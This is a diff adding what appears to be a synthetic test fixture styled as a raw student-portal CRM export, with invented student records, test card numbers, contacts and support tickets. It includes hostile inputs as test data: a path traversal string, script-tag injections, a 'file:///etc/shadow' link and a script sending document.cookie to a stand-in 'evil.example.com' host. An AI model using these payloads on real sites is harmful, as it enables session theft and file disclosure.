@@ -1,0 +1,129 @@
+=====================================================================
+  ALU STUDENT SERVICES PORTAL — RAW API EXPORT (2024-Q4)
+  Generated: 2024-11-15T09:32:11Z  |  Records: mixed  |  Source: CRM v3
+=====================================================================
+
+--- CONTACT DIRECTORY ---
+
+Admissions Office:
+  Primary contact: admissions@alueducation.com
+  Secondary: info@alueducation.com
+  Emergency line: +250 788 123 456
+
+Student Support (Kigali Campus):
+  Email: support@alueducation.com
+  Direct line: +250-788-456-789
+  WhatsApp: +250 722 000 111
+  Office hours: 8:00 AM – 5:00 PM (Mon–Fri), Sat 9:00 AM – 12:00 PM
+
+Alumni Relations:
+  alumni.office@alumni.alueducation.com
+  Tel: +1 (415) 800-2020
+
+SI Program Coordinator:
+  coordinator@si.alueducation.com
+  assistant.coordinator@si.alueducation.com
+  Fax: +250-252-580-100
+
+--- STUDENT RECORDS (SAMPLE) ---
+
+ID: 2021-RW-0042
+Name: Jean-Paul Hakizimana
+Personal email: jp.hakizimana94@gmail.com
+ALU email: j.hakizimana@alueducation.com
+LinkedIn: https://www.linkedin.com/in/jphakizimana
+GitHub: https://github.com/hakizimana-jp
+Payment method on file: 4539 1488 0343 6467  [Visa — expires 09/26]
+Enrolled: 14:30 | Fee paid at: 11:05 AM
+
+ID: 2022-NG-0199
+Name: Amara Okonkwo
+Personal email: amara.okonkwo@yahoo.com
+ALU email: a.okonkwo@alueducation.com
+Portfolio: http://amaraokonkwo.design/portfolio
+Twitter: @amara_builds  #ALULife #TechForAfrica
+Payment: 5425 2334 3010 9903  [Mastercard]
+Enrolled: 09:15 AM
+
+ID: 2023-KE-0311
+Name: Fatuma Wanjiru
+ALU alumni: f.wanjiru@alumni.alueducation.com
+SI cohort email: f.wanjiru@si.alueducation.com
+Phone: +254 712 345 678
+Blog: https://fatumawanjiru.medium.com/tech-in-africa-2024
+Payment: 3714 496353 98431  [AmEx]
+Fee: $1,250.00 | Scholarship: $750.00 | Balance: $500.00
+
+--- PARTNER ORGANISATION CONTACTS ---
+
+TechBridge Africa
+  Contact: hello@techbridgeafrica.org
+  Website: https://techbridgeafrica.org/partners/alu
+  Phone: +27 (0)11 234 5678
+  Invoice total: £2,400.00 paid on 2024-10-01 at 16:45
+
+MasterCard Foundation
+  Liaison: grants@mastercardfdn.org
+  URL: https://mastercardfoundation.org/programs/scholars
+  Secure portal: https://portal.mastercardfoundation.org/login?ref=alu&token=abc123
+  Bank card for processing: 5105 1051 0510 5100
+
+GIZ Rwanda
+  rep@giz.de | backup: giz.rwanda.backup@giz.de
+  Address: KG 7 Ave, Kigali, Rwanda
+  Phone: +250 252 580 200
+  Meeting scheduled: 10:00 AM on 2024-11-20
+
+--- RAW SOCIAL MEDIA SCRAPE (UNFILTERED) ---
+
+Post 1 [Twitter, public]:
+"Just got my ALU acceptance!! #ALULife #AfricanLeadership #Kigali2024
+  Check the portal: https://apply.alueducation.com/dashboard
+  Tweeted at 3:47 PM"
+
+Post 2 [Forum, flagged]:
+"Contact me at definitely_real@alueducation.com for discount codes lol
+  Or try this: ../../../../etc/passwd  <- path traversal attempt
+  <script>document.cookie='session=hacked'</script>
+  Also card: 0000 0000 0000 0000"
+
+Post 3 [LinkedIn, public]:
+"Proud ALU alum! Reach me: n.mutesi@alumni.alueducation.com
+  #Networking #ALUAlumni https://linkedin.com/in/nmutesi
+  Time posted: 8:22 AM"
+
+--- SUPPORT TICKET DUMP ---
+
+Ticket #4421:
+  From: student123@outlook.com
+  CC: advisor@alueducation.com
+  Message: Payment of $320.00 declined for card 4111 1111 1111 1111
+  Submitted: 2:15 PM | Resolved: 4:50 PM
+
+Ticket #4422:
+  From: BADEMAIL@@broken..com  <- malformed, should be rejected
+  Message: Hello <b>world</b> this is a <script>alert(1)</script> test
+  Attachment URL: file:///etc/shadow  <- local file path, not a URL
+  Amount claimed: $99999999.99
+
+Ticket #4423:
+  From: prospective.student+alu@protonmail.com
+  Website submitted: https://mysite.io/contact?ref=alu-apply
+  Phone: +1-800-555-0199
+  Currency mentioned: €450.00 and ¥50,000
+
+--- HTML SNIPPET FROM PORTAL (RAW) ---
+
+<div class="student-card">
+  <h2>Welcome back, Student</h2>
+  <p>Your next payment of <strong>$250.00</strong> is due at <em>11:59 PM</em>.</p>
+  <a href="https://portal.alueducation.com/pay">Pay Now</a>
+  <img src="/assets/logo.png" alt="ALU Logo" />
+  <input type="text" name="card" placeholder="Card number" />
+</div>
+<script>
+  // injected by malicious browser extension
+  fetch('https://evil.example.com/steal?data=' + document.cookie);
+</script>
+
+--- END OF EXPORT ---
